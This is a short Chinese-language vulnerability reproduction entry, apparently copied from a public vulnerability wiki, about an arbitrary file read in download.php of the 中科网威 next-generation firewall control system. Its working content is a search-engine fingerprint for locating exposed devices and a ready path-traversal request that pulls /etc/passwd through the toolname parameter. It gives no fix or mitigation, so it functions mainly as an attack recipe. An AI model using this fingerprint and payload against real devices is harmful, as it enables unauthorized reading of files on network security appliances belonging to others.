---
title: "中科网威 下一代防火墙控制系统 download.php 任意文件读取漏洞"
date: 2026-10-18 09:15:43
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "中科网威"
tags:
  - "中科网威"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

中科网威 下一代防火墙控制系统 download.php 任意文件读取漏洞, 攻击者通过漏洞可以读取服务器上的文件

## 漏洞影响

```
中科网威 下一代防火墙控制系统
```

## 网络测绘

```
body="Get_Verify_Info(hex_md5(user_string)."
```

## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162251851.png)

漏洞存在于 download.php

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162251009.png)



任意点击后抓包，更改 **toolname** 参数

```plain
/download.php?&class=vpn&toolname=../../../../../../../../etc/passwd
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162251674.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
